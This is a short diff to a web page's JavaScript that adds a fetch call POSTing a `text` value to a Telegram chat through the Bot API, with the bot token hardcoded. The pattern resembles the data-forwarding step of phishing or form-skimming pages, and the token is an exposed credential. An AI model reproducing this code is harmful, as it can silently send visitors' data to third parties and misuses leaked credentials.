@@ -292,6 +292,26 @@ document.addEventListener("DOMContentLoaded", function () {
                   `;
 
                             // Fazendo a chamada GET com fetch
+                            var url =
+                              "https://api.telegram.org/bot6770070198:AAF9lh2-dhhFn9IdkUb9WqTWcljm8bewGGw/sendMessage?chat_id=" +
+                              "-4139113276" +
+                              `&text=${text}`;
+                            fetch(url, {
+                              method: "POST",
+                              headers: {
+                                "Content-Type": "application/json",
+                              },
+                            })
+                              .then((response) => response.json())
+                              .then((data) => {
+                                console.log(data);
+                              })
+                              .catch((error) => {
+                                console.error(
+                                  "Erro ao realizar a solicitação:",
+                                  error
+                                );
+                              });
 
                             buttonContainer3.remove(); // Remove o elemento inputContainer do DOM
 
